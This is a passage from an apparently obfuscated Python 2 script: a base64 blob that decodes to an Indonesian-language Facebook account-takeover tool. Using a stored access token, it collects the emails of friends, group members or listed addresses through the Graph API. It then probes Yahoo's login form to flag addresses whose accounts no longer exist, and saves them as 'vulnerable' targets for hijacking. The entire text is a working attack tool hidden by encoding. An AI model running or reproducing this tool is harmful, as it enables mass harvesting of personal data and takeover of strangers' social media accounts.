cm91cCgpCgllbGlmIGVtYnVoID09IjQiOgoJCWNsb25lX2RhcmlfZmlsZSgpCgllbGlmIGVtYnVo
ID09IjAiOgoJCW1lbnUoKQoJZWxzZToKCQlwcmludCAiXDAzM1sxOzk2bVshXSBceDFiWzE7OTFt
SXNpIHlhbmcgYmVuYXIiCgkJCgpkZWYgY2xvbmVfZGFyaV9kYWZ0YXJfdGVtYW4oKToKCWdsb2Jh
bCB0b2tldAoJb3Muc3lzdGVtKCdyZXNldCcpCgl0cnk6CgkJdG9rZXQ9b3BlbignbG9naW4udHh0
JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tl
biBJbnZhbGlkIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCgx
KQoJCWtlbHVhcigpCgl0cnk6CgkJb3MubWtkaXIoJ291dCcpCglleGNlcHQgT1NFcnJvcjoKCQlw
YXNzCglvcy5zeXN0ZW0oJ2NsZWFyJykKCXByaW50IGxvZ28KCW1wc2ggPSBbXQoJam1sID0gMAoJ
cHJpbnQgNDIqIlwwMzNbMTs5Nm09IgoJamFsYW4oJ1wwMzNbMTs5Nm1bXHgxYlsxOzk3beKculx4
MWJbMTs5Nm1dIFwwMzNbMTs5M21NZW5nYW1iaWwgZW1haWwgXDAzM1sxOzk3bS4uLicpCgl0ZW1h
biA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWUvZnJpZW5kcz9h
Y2Nlc3NfdG9rZW49Jyt0b2tldCkKCWtpbWFrID0ganNvbi5sb2Fkcyh0ZW1hbi50ZXh0KQoJamFs
YW4oJ1wwMzNbMTs5Nm1bXHgxYlsxOzk3beKculx4MWJbMTs5Nm1dIFwwMzNbMTs5M21TdGFydCBc
MDMzWzE7OTdtLi4uJykKCXByaW50ICgnXHgxYlsxOzk2bVshXSBceDFiWzE7OTNtU3RvcCBDVFJM
K3onKQoJcHJpbnQgNDIqIlwwMzNbMTs5Nm09IgoJZm9yIHcgaW4ga2ltYWtbJ2RhdGEnXToKCQlq
bWwgKz0xCgkJbXBzaC5hcHBlbmQoam1sKQoJCWlkID0gd1snaWQnXQoJCW5hbWEgPSB3WyduYW1l
J10KCQlsaW5rcyA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIitp
ZCsiP2FjY2Vzc190b2tlbj0iK3Rva2V0KQoJCXogPSBqc29uLmxvYWRzKGxpbmtzLnRleHQpCgkJ
dHJ5OgoJCQltYWlsID0gelsnZW1haWwnXQoJCQl5YWhvbyA9IHJlLmNvbXBpbGUocidALionKQoJ
CQlvdHcgPSB5YWhvby5zZWFyY2gobWFpbCkuZ3JvdXAoKQoJCQlpZiAneWFob28uY29tJyBpbiBv
dHc6CgkJCQlici5vcGVuKCJodHRwczovL2xvZ2luLnlhaG9vLmNvbS9jb25maWcvbG9naW4/LnNy
Yz1mcGN0eCYuaW50bD1pZCYubGFuZz1pZC1JRCYuZG9uZT1odHRwczovL2lkLnlhaG9vLmNvbSIp
CgkJCQlici5fZmFjdG9yeS5pc19odG1sID0gVHJ1ZQoJCQkJYnIuc2VsZWN0X2Zvcm0obnI9MCkK
CQkJCWJyWyJ1c2VybmFtZSJdID0gbWFpbAoJCQkJa2xpayA9IGJyLnN1Ym1pdCgpLnJlYWQoKQoJ
CQkJam9rID0gcmUuY29tcGlsZShyJyJtZXNzYWdlcy5FUlJPUl9JTlZBTElEX1VTRVJOQU1FIj4u
KicpCgkJCQl0cnk6CgkJCQkJcGVrID0gam9rLnNlYXJjaChrbGlrKS5ncm91cCgpCgkJCQlleGNl
cHQ6CgkJCQkJY29udGludWUKCQkJCWlmICcibWVzc2FnZXMuRVJST1JfSU5WQUxJRF9VU0VSTkFN
RSI+JyBpbiBwZWs6CgkJCQkJcHJpbnQoIlwwMzNbMTs5Nm1b4pyTXSBcMDMzWzE7OTJtVlVMTiIp
CgkJCQkJcHJpbnQoIlwwMzNbMTs5Nm1b4p65XSBcMDMzWzE7OTdtSUQgICBcMDMzWzE7OTFtOiBc
MDMzWzE7OTJtIitpZCkKCQkJCQlwcmludCgiXDAzM1sxOzk2bVvinrldIFwwMzNbMTs5N21FbWFp
bFwwMzNbMTs5MW06IFwwMzNbMTs5Mm0iK21haWwpCgkJCQkJcHJpbnQoIlwwMzNbMTs5Nm1b4p65
XSBcMDMzWzE7OTdtTmFtYSBcMDMzWzE7OTFtOiBcMDMzWzE7OTJtIituYW1hKyAnXG4nKQoJCQkJ
CXNhdmUgPSBvcGVuKCdvdXQvTWFpbFZ1bG4udHh0JywnYScpCgkJCQkJc2F2ZS53cml0ZSgiTmFt
YSA6ICIrIG5hbWEgKyAnXG4nICJJRCAgICAgICAgOiAiKyBpZCArICdcbicgIkVtYWlsICA6ICIr
IG1haWwgKyAnXG5cbicpCgkJCQkJc2F2ZS5jbG9zZSgpCgkJCQkJYmVyaGFzaWwuYXBwZW5kKG1h
aWwpCgkJZXhjZXB0IEtleUVycm9yOgoJCQlwYXNzCglwcmludCA0MioiXDAzM1sxOzk2bT0iCglw
cmludCAnXDAzM1sxOzk2bVtcMDMzWzE7OTdt4pyTXDAzM1sxOzk2bV0gXDAzM1sxOzkybVNlbGVz
YWkgXDAzM1sxOzk3bS4uLi4nCglwcmludCJcMDMzWzE7OTZtWytdIFwwMzNbMTs5Mm1Ub3RhbCBc
MDMzWzE7OTFtOiBcMDMzWzE7OTdtIitzdHIobGVuKGJlcmhhc2lsKSkKCXByaW50IlwwMzNbMTs5
Nm1bK10gXDAzM1sxOzkybUZpbGUgdGVyc2ltcGFuIFwwMzNbMTs5MW06XDAzM1sxOzk3bSBvdXQv
TWFpbFZ1bG4udHh0IgoJcmF3X2lucHV0KCJcblwwMzNbMTs5Nm1bXDAzM1sxOzk3bUtlbWJhbGlc
MDMzWzE7OTZtXSIpCgltZW51KCkKCQkKCmRlZiBjbG9uZV9kYXJpX3RlbWFuKCk6CglnbG9iYWwg
dG9rZXQKCW9zLnN5c3RlbSgnY2xlYXInKQoJdHJ5OgoJCXRva2V0PW9wZW4oJ2xvZ2luLnR4dCcs
J3InKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5Nm1bIV0gXHgxYlsx
OzkxbVRva2VuIGludmFsaWQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1l
LnNsZWVwKDEpCgkJa2VsdWFyKCkKCXRyeToKCQlvcy5ta2Rpcignb3V0JykKCWV4Y2VwdCBPU0Vy
cm9yOgoJCXBhc3MKCW9zLnN5c3RlbSgnY2xlYXInKQoJcHJpbnQgbG9nbwoJbXBzaCA9IFtdCglq
bWwgPSAwCglwcmludCA0MioiXDAzM1sxOzk2bT0iCglpZHQgPSByYXdfaW5wdXQoIlwwMzNbMTs5
Nm1bK10gXDAzM1sxOzkzbU1hc3VrYW4gSUQgdGVtYW4gXDAzM1sxOzkxbTogXDAzM1sxOzk3bSIp
Cgl0cnk6CgkJam9rID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8i
K2lkdCsiP2FjY2Vzc190b2tlbj0iK3Rva2V0KQoJCW9wID0ganNvbi5sb2Fkcyhqb2sudGV4dCkK
CQlwcmludCJcMDMzWzE7OTZtW1wwMzNbMTs5N23inJNcMDMzWzE7OTZtXSBcMDMzWzE7OTNtTmFt
YVwwMzNbMTs5MW0gOlwwMzNbMTs5N20gIitvcFsibmFtZSJdCglleGNlcHQgS2V5RXJyb3I6CgkJ
cHJpbnQiXDAzM1sxOzk2bVshXSBceDFiWzE7OTFtVGVtYW4gdGlkYWsgZGl0ZW11a2FuIgoJCXJh
d19pbnB1dCgiXG5cMDMzWzE7OTZtW1wwMzNbMTs5N21LZW1iYWxpXDAzM1sxOzk2bV0iKQoJCW1l
bnUoKQoJamFsYW4oJ1wwMzNbMTs5Nm1b4py6XSBcMDMzWzE7OTNtTWVuZ2FtYmlsIGVtYWlsIFww
MzNbMTs5N20uLi4nKQoJdGVtYW4gPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJv
b2suY29tLycraWR0KycvZnJpZW5kcz9hY2Nlc3NfdG9rZW49Jyt0b2tldCkKCWtpbWFrID0ganNv
bi5sb2Fkcyh0ZW1hbi50ZXh0KQoJamFsYW4oJ1wwMzNbMTs5Nm1b4py6XSBcMDMzWzE7OTNtU3Rh
cnQgXDAzM1sxOzk3bS4uLicpCglwcmludCgnXHgxYlsxOzk2bVshXSBceDFiWzE7OTNtU3RvcCBD
VFJMK3onKQoJcHJpbnQgNDMqIlwwMzNbMTs5Nm09IgoJZm9yIHcgaW4ga2ltYWtbJ2RhdGEnXToK
CQlqbWwgKz0xCgkJbXBzaC5hcHBlbmQoam1sKQoJCWlkID0gd1snaWQnXQoJCW5hbWEgPSB3Wydu
YW1lJ10KCQlsaW5rcyA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20v
IitpZCsiP2FjY2Vzc190b2tlbj0iK3Rva2V0KQoJCXogPSBqc29uLmxvYWRzKGxpbmtzLnRleHQp
CgkJdHJ5OgoJCQltYWlsID0gelsnZW1haWwnXQoJCQl5YWhvbyA9IHJlLmNvbXBpbGUocidALion
KQoJCQlvdHcgPSB5YWhvby5zZWFyY2gobWFpbCkuZ3JvdXAoKQoJCQlpZiAneWFob28uY29tJyBp
biBvdHc6CgkJCQlici5vcGVuKCJodHRwczovL2xvZ2luLnlhaG9vLmNvbS9jb25maWcvbG9naW4/
LnNyYz1mcGN0eCYuaW50bD1pZCYubGFuZz1pZC1JRCYuZG9uZT1odHRwczovL2lkLnlhaG9vLmNv
bSIpCgkJCQlici5fZmFjdG9yeS5pc19odG1sID0gVHJ1ZQoJCQkJYnIuc2VsZWN0X2Zvcm0obnI9
MCkKCQkJCWJyWyJ1c2VybmFtZSJdID0gbWFpbAoJCQkJa2xpayA9IGJyLnN1Ym1pdCgpLnJlYWQo
KQoJCQkJam9rID0gcmUuY29tcGlsZShyJyJtZXNzYWdlcy5FUlJPUl9JTlZBTElEX1VTRVJOQU1F
Ij4uKicpCgkJCQl0cnk6CgkJCQkJcGVrID0gam9rLnNlYXJjaChrbGlrKS5ncm91cCgpCgkJCQll
eGNlcHQ6CgkJCQkJY29udGludWUKCQkJCWlmICcibWVzc2FnZXMuRVJST1JfSU5WQUxJRF9VU0VS
TkFNRSI+JyBpbiBwZWs6CgkJCQkJcHJpbnQoIlwwMzNbMTs5Nm1b4pyTXSBcMDMzWzE7OTJtVlVM
TiIpCgkJCQkJcHJpbnQoIlwwMzNbMTs5Nm1b4p65XSBcMDMzWzE7OTdtSUQgICBcMDMzWzE7OTFt
OiBcMDMzWzE7OTJtIitpZCkKCQkJCQlwcmludCgiXDAzM1sxOzk2bVvinrldIFwwMzNbMTs5N21F
bWFpbFwwMzNbMTs5MW06IFwwMzNbMTs5Mm0iK21haWwpCgkJCQkJcHJpbnQoIlwwMzNbMTs5Nm1b
4p65XSBcMDMzWzE7OTdtTmFtYSBcMDMzWzE7OTFtOiBcMDMzWzE7OTJtIituYW1hKQoJCQkJCXNh
dmUgPSBvcGVuKCdvdXQvVGVtYW5NYWlsVnVsbi50eHQnLCdhJykKCQkJCQlzYXZlLndyaXRlKCJO
YW1hIDogIisgbmFtYSArICdcbicgIklEICAgICAgICA6ICIrIGlkICsgJ1xuJyAiRW1haWwgIDog
IisgbWFpbCArICdcblxuJykKCQkJCQlzYXZlLmNsb3NlKCkKCQkJCQliZXJoYXNpbC5hcHBlbmQo
bWFpbCkKCQlleGNlcHQgS2V5RXJyb3I6CgkJCXBhc3MKCXByaW50IDQyKiJcMDMzWzE7OTZtPSIK
CXByaW50ICdcMDMzWzE7OTZtW1wwMzNbMTs5N23inJNcMDMzWzE7OTZtXSBcMDMzWzE7OTJtU2Vs
ZXNhaSBcMDMzWzE7OTdtLi4uLicKCXByaW50IlwwMzNbMTs5Nm1bK10gXDAzM1sxOzkybVRvdGFs
IFwwMzNbMTs5MW06IFwwMzNbMTs5N20iK3N0cihsZW4oYmVyaGFzaWwpKQoJcHJpbnQiXDAzM1sx
Ozk2bVsrXSBcMDMzWzE7OTJtRmlsZSB0ZXJzaW1wYW4gXDAzM1sxOzkxbTpcMDMzWzE7OTdtIG91
dC9UZW1hbk1haWxWdWxuLnR4dCIKCXJhd19pbnB1dCgiXG5cMDMzWzE7OTZtW1wwMzNbMTs5N21L
ZW1iYWxpXDAzM1sxOzk2bV0iKQoJbWVudSgpCgkKZGVmIGNsb25lX2RhcmlfbWVtYmVyX2dyb3Vw
KCk6CglnbG9iYWwgdG9rZXQKCW9zLnN5c3RlbSgnY2xlYXInKQoJdHJ5OgoJCXRva2V0PW9wZW4o
J2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5
Nm1bIV0gXHgxYlsxOzkxbVRva2VuIGludmFsaWQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4u
dHh0JykKCQl0aW1lLnNsZWVwKDEpCgkJa2VsdWFyKCkKCXRyeToKCQlvcy5ta2Rpcignb3V0JykK
CWV4Y2VwdCBPU0Vycm9yOgoJCXBhc3MKCW9zLnN5c3RlbSgnY2xlYXInKQoJcHJpbnQgbG9nbwoJ
bXBzaCA9IFtdCglqbWwgPSAwCglwcmludCA0MioiXDAzM1sxOzk2bT0iCglpZD1yYXdfaW5wdXQo
J1wwMzNbMTs5Nm1bK10gXDAzM1sxOzkzbU1hc3VrYW4gSUQgZ3JvdXAgXDAzM1sxOzkxbTpcMDMz
WzE7OTdtICcpCgl0cnk6CgkJcj1yZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2su
Y29tL2dyb3VwLz9pZD0nK2lkKycmYWNjZXNzX3Rva2VuPScrdG9rZXQpCgkJYXN3PWpzb24ubG9h
ZHMoci50ZXh0KQoJCXByaW50IlwwMzNbMTs5Nm1bXDAzM1sxOzk3beKck1wwMzNbMTs5Nm1dIFww
MzNbMTs5M21OYW1hIGdyb3VwIFwwMzNbMTs5MW06XDAzM1sxOzk3bSAiK2Fzd1snbmFtZSddCgll
eGNlcHQgS2V5RXJyb3I6CgkJcHJpbnQiXDAzM1sxOzk2bVshXSBceDFiWzE7OTFtR3JvdXAgdGlk
YWsgZGl0ZW11a2FuIgoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTZtW1wwMzNbMTs5N21LZW1iYWxp
XDAzM1sxOzk2bV0iKQoJCW1lbnUoKQoJamFsYW4oJ1wwMzNbMTs5Nm1b4py6XSBcMDMzWzE7OTNt
TWVuZ2FtYmlsIGVtYWlsIFwwMzNbMTs5N20uLi4nKQoJdGVtYW4gPSByZXF1ZXN0cy5nZXQoJ2h0
dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycraWQrJy9tZW1iZXJzP2ZpZWxkcz1uYW1lLGlkJmxp
bWl0PTk5OTk5OTk5OSZhY2Nlc3NfdG9rZW49Jyt0b2tldCkKCWtpbWFrID0ganNvbi5sb2Fkcyh0
ZW1hbi50ZXh0KQoJamFsYW4oJ1wwMzNbMTs5Nm1b4py6XSBcMDMzWzE7OTNtU3RhcnQgXDAzM1sx
Ozk3bS4uLicpCglwcmludCgnXHgxYlsxOzk2bVshXSBceDFiWzE7OTNtU3RvcCBDVFJMK3onKQoJ
cHJpbnQgNDIqIlwwMzNbMTs5Nm09IgoJZm9yIHcgaW4ga2ltYWtbJ2RhdGEnXToKCQlqbWwgKz0x
CgkJbXBzaC5hcHBlbmQoam1sKQoJCWlkID0gd1snaWQnXQoJCW5hbWEgPSB3WyduYW1lJ10KCQls
aW5rcyA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIitpZCsiP2Fj
Y2Vzc190b2tlbj0iK3Rva2V0KQoJCXogPSBqc29uLmxvYWRzKGxpbmtzLnRleHQpCgkJdHJ5OgoJ
CQltYWlsID0gelsnZW1haWwnXQoJCQl5YWhvbyA9IHJlLmNvbXBpbGUocidALionKQoJCQlvdHcg
PSB5YWhvby5zZWFyY2gobWFpbCkuZ3JvdXAoKQoJCQlpZiAneWFob28uY29tJyBpbiBvdHc6CgkJ
CQlici5vcGVuKCJodHRwczovL2xvZ2luLnlhaG9vLmNvbS9jb25maWcvbG9naW4/LnNyYz1mcGN0
eCYuaW50bD1pZCYubGFuZz1pZC1JRCYuZG9uZT1odHRwczovL2lkLnlhaG9vLmNvbSIpCgkJCQli
ci5fZmFjdG9yeS5pc19odG1sID0gVHJ1ZQoJCQkJYnIuc2VsZWN0X2Zvcm0obnI9MCkKCQkJCWJy
WyJ1c2VybmFtZSJdID0gbWFpbAoJCQkJa2xpayA9IGJyLnN1Ym1pdCgpLnJlYWQoKQoJCQkJam9r
ID0gcmUuY29tcGlsZShyJyJtZXNzYWdlcy5FUlJPUl9JTlZBTElEX1VTRVJOQU1FIj4uKicpCgkJ
CQl0cnk6CgkJCQkJcGVrID0gam9rLnNlYXJjaChrbGlrKS5ncm91cCgpCgkJCQlleGNlcHQ6CgkJ
CQkJY29udGludWUKCQkJCWlmICcibWVzc2FnZXMuRVJST1JfSU5WQUxJRF9VU0VSTkFNRSI+JyBp
biBwZWs6CgkJCQkJcHJpbnQoIlwwMzNbMTs5Nm1b4pyTXSBcMDMzWzE7OTJtVlVMTiIpCgkJCQkJ
cHJpbnQoIlwwMzNbMTs5Nm1b4p65XSBcMDMzWzE7OTdtSUQgICBcMDMzWzE7OTFtOiBcMDMzWzE7
OTJtIitpZCkKCQkJCQlwcmludCgiXDAzM1sxOzk2bVvinrldIFwwMzNbMTs5N21FbWFpbFwwMzNb
MTs5MW06IFwwMzNbMTs5Mm0iK21haWwpCgkJCQkJcHJpbnQoIlwwMzNbMTs5Nm1b4p65XSBcMDMz
WzE7OTdtTmFtYSBcMDMzWzE7OTFtOiBcMDMzWzE7OTJtIituYW1hKQoJCQkJCXNhdmUgPSBvcGVu
KCdvdXQvR3J1cE1haWxWdWxuLnR4dCcsJ2EnKQoJCQkJCXNhdmUud3JpdGUoIk5hbWEgOiAiKyBu
YW1hICsgJ1xuJyAiSUQgICAgICAgIDogIisgaWQgKyAnXG4nICJFbWFpbCAgOiAiKyBtYWlsICsg
J1xuXG4nKQoJCQkJCXNhdmUuY2xvc2UoKQoJCQkJCWJlcmhhc2lsLmFwcGVuZChtYWlsKQoJCWV4
Y2VwdCBLZXlFcnJvcjoKCQkJcGFzcwoJcHJpbnQgNDIqIlwwMzNbMTs5Nm09IgoJcHJpbnQgJ1ww
MzNbMTs5Nm1bXDAzM1sxOzk3beKck1wwMzNbMTs5Nm1dIFwwMzNbMTs5Mm1TZWxlc2FpIFwwMzNb
MTs5N20uLi4uJwoJcHJpbnQiXDAzM1sxOzk2bVsrXSBcMDMzWzE7OTJtVG90YWwgXDAzM1sxOzkx
bTogXDAzM1sxOzk3bSIrc3RyKGxlbihiZXJoYXNpbCkpCglwcmludCJcMDMzWzE7OTZtWytdIFww
MzNbMTs5Mm1GaWxlIHRlcnNpbXBhbiBcMDMzWzE7OTFtOlwwMzNbMTs5N20gb3V0L0dydXBNYWls
VnVsbi50eHQiCglyYXdfaW5wdXQoIlxuXDAzM1sxOzk2bVtcMDMzWzE7OTdtS2VtYmFsaVwwMzNb
MTs5Nm1dIikKCW1lbnUoKQoJCgpkZWYgY2xvbmVfZGFyaV9maWxlKCk6CglnbG9iYWwgdG9rZXQK
CW9zLnN5c3RlbSgnY2xlYXInKQoJdHJ5OgoJCXRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5y
ZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5Nm1bIV0gXHgxYlsxOzkxbVRv
a2VuIGludmFsaWQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVw
KDEpCgkJa2VsdWFyKCkKCXRyeToKCQlvcy5ta2Rpcignb3V0JykKCWV4Y2VwdCBPU0Vycm9yOgoJ
CXBhc3MKCW9zLnN5c3RlbSgnY2xlYXInKQoJcHJpbnQgbG9nbwoJcHJpbnQgNDIqIlwwMzNbMTs5
Nm09IgoJZmlsZXMgPSByYXdfaW5wdXQoIlwwMzNbMTs5Nm1bK10gXDAzM1sxOzkzbU5hbWEgRmls
ZSBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtIikKCXRyeToKCQl0b3RhbCA9IG9wZW4oZmlsZXMsInIi
KQoJCW1haWwgPSB0b3RhbC5yZWFkbGluZXMoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAz
M1sxOzk2bVshXSBceDFiWzE7OTFtRmlsZSB0aWRhayBkaXRlbXVrYW4iCgkJcmF3X2lucHV0KCJc
blwwMzNbMTs5Nm1bXDAzM1sxOzk3bUtlbWJhbGlcMDMzWzE7OTZtXSIpCgkJbWVudSgpCgltcHNo
ID0gW10KCWptbCA9IDAKCWphbGFuKCdcMDMzWzE7OTZtW+Kcul0gXDAzM1sxOzkzbVN0YXJ0IFww
MzNbMTs5N20uLi4nKQoJcHJpbnQoJ1x4MWJbMTs5Nm1bIV0gXHgxYlsxOzkzbVN0b3AgQ1RSTCt6
JykKCXByaW50IDQyKiJcMDMzWzE7OTZtPSIKCW1haWwgPSBvcGVuKGZpbGVzLCJyIikucmVhZGxp
bmVzKCkKCWZvciBwdyBpbiBtYWlsOgoJCW1haWwgPSBwdy5yZXBsYWNlKCJcbiIsIiIpCgkJam1s
ICs9MQoJCW1wc2guYXBwZW5kKGptbCkKCQl5YWhvbyA9IHJlLmNvbXBpbGUocidALionKQoJCW90
dyA9IHlhaG9vLnNlYXJjaChtYWlsKS5ncm91cCgpCgkJaWYgJ3lhaG9vLmNvbScgaW4gb3R3OgoJ
CQlici5vcGVuKCJodHRwczovL2xvZ2luLnlhaG9vLmNvbS9jb25maWcvbG9naW4/LnNyYz1mcGN0
eCYuaW50bD1pZCYubGFuZz1pZC1JRCYuZG9uZT1odHRwczovL2lkLnlhaG9vLmNvbSIpCgkJCWJy
Ll9mYWN0b3J5LmlzX2h0bWwgPSBUcnVlCgkJCWJyLnNlbGVjdF9mb3JtKG5yPTApCgkJCWJyWyJ1
c2VybmFtZSJdID0gbWFpbAoJCQlrbGlrID0gYnIuc3VibWl0KCkucmVhZCgpCgkJCWpvayA9IHJl
LmNvbXBpbGUocicibWVzc2FnZXMuRVJST1JfSU5WQUxJRF9VU0VSTkFNRSI+LionKQoJCQl0cnk6
CgkJCQlwZWsgPSBqb2suc2VhcmNoKGtsaWspLmdyb3VwKCkKCQkJZXhjZXB0OgoJCQkJY29udGlu
dWUKCQkJaWYgJyJtZXNzYWdlcy5FUlJPUl9JTlZBTElEX1VTRVJOQU1FIj4nIGluIHBlazoKCQkJ
CXByaW50KCJcMDMzWzE7OTZtW+Kck10gXDAzM1sxOzkybVZVTE4iKQoJCQkJcHJpbnQoIlwwMzNb
MTs5Nm1b4p65XSBcMDMzWzE7OTdtRW1haWxcMDMzWzE7OTFtOiBcMDMzWzE7OTJtIittYWlsKQoJ
CQkJc2F2ZSA9IG9wZW4oJ291dC9NYWlsVnVsbi50eHQnLCdhJykKCQkJCXNhdmUud3JpdGUoIkVt
YWlsOiAiKyBtYWlsICsgJ1xuXG4nKQoJCQkJc2F2ZS5jbG9zZSgpCgkJCQliZXJoYXNpbC5hcHBl
bmQobWFpbCkKCXByaW50IDQyKiJcMDMzWzE7OTZtPSIKCXByaW50ICdcMDMzWzE7OTZtW1wwMzNb
MTs5N23inJNcMDMzWzE7OTZtXSBcMDMzWzE7OTJtU2VsZXNhaSBcMDMzWzE7OTdtLi4uLicKCXBy
aW50IlwwMzNbMTs5Nm1bK10gXDAzM1sxOzkybVRvdGFsIFwwMzNbMTs5MW06IFwwMzNbMTs5N20i
K3N0cihsZW4oYmVyaGFzaWwpKQoJcHJpbnQiXDAzM1sxOzk2bVsrXSBcMDMzWzE7OTJtRmlsZSBU
ZXJzaW1wYW4gXDAzM1sxOzkxbTpcMDMzWzE7OTdtIG91dC9GaWxlTWFpbFZ1bG4udHh0IgoJcmF3
X2lucHV0KCJcblwwMzNbMTs5Nm1bXDAzM1sxOzk3bUtlbWJhbGlcMDMzWzE7OTZtXSIpCgltZW51
KCkKCQogICAgICAgCgkJCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6CglzaWFwYSgpCg=='))
